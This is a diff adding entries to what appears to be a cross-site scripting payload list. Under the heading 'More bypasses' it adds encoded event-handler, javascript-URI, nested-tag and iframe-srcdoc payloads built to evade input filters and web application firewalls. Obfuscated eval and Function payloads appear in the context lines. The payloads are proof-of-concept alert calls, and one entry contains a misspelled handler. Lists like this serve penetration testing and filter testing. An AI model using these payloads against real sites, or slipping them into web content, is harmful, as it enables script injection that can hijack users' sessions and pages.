@@ -29,3 +29,17 @@
 <script>eval(decodeURIComponent("%61%6c%65%72%74%28%31%29"))</script>
 <script>Function("ale"+"rt(1)")()</script>
 <script>setTimeout`alert\x281\x29`</script>
+
+# More bypasses
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<svg/onload=alert&#x28;1&#x29>
+<details/open/ontoggle=alert`1`>
+<a href="j&#97;v&#97;script:alert(1)">Click</a>
+<scr<script>ipt>alert(1)</scr<script>ipt>
+"><script>alert&#40/dominator_waf_bypass/&#41</script>
+<img/src="x"onerror=prompt(1)>
+<//img src=x onerror=alert(1)>
+<img src=x: oneerror=alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+<a href=javascript&colon;alert(1)>click</a>
+<input onfocus="alert(1)" autofocus>
